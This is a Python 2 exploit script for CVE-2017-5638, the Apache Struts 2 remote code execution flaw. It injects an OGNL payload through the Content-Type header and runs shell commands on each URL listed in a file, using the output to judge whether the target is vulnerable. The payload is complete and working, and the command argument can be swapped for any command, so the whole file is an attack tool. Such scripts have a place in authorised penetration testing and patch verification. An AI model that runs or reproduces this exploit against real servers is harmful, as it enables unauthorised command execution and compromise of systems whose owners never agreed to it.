# CVE-2017-5638
#
# Apache Struts 2.0 RCE vulnerability
#
# A script to exploit CVE-2017-5638 - It allows an attacker to inject OS commands
# into a web application through the content-type header
#
# Author:  Harish Tiwari
# Email:   harish@payatu.com
# Website: http://www.payatu.com
# Copyright (c) 2017-2027
# License: GPL V3

# create a file urls.txt in the same directory that should contain all the urls to be tested

#! /usr/bin/python -tt
import urllib2
import httplib

def exploit(url, cmd):
	payload = "%{(#_='multipart/form-data')."
	payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
	payload += "(#_memberAccess?"
	payload += "(#_memberAccess=#dm):"
	payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
	payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
	payload += "(#ognlUtil.getExcludedPackageNames().clear())."
	payload += "(#ognlUtil.getExcludedClasses().clear())."
	payload += "(#context.setMemberAccess(#dm))))."
	payload += "(#cmd='%s')." % cmd
	payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
	payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
	payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
	payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
	payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
	payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
	payload += "(#ros.flush())}"
 
	try:
        	headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
        	request = urllib2.Request(url, headers=headers)
        	page = urllib2.urlopen(request).read()
	except Exception, e:
		page = e
	return page

def main():
	with open("urls.txt") as f:
		content = f.readlines()
	content = [x.strip() for x in content]
	for ele in content:
		output = exploit(str(ele), "dir")	
		print "[*] Testing url : "+ ele + "\n"
		if "/bin/bash: dir: command not found" in output:
			print ":Linux System:\n"
			output = exploit(str(ele), "ls -all")
			items = output.split()
			if items[0] == "total":
				print "[+] url " + str(ele) + " is vulnerable\n"
			
		elif "Volume Serial Number is" in output:
			print ":Windows System:\n"
			print "[+] url " + str(ele) + " is vulnerable\n"

		else:
			output = exploit(str(ele), "dir --version")
			if "This is free software: you are free to change and redistribute it" in output:
				print ":Linux System Supporting dir utility:\n"
				print "[+] url " + str(ele) + " is vulnerable\n"				
				
if __name__ == "__main__":
	main()
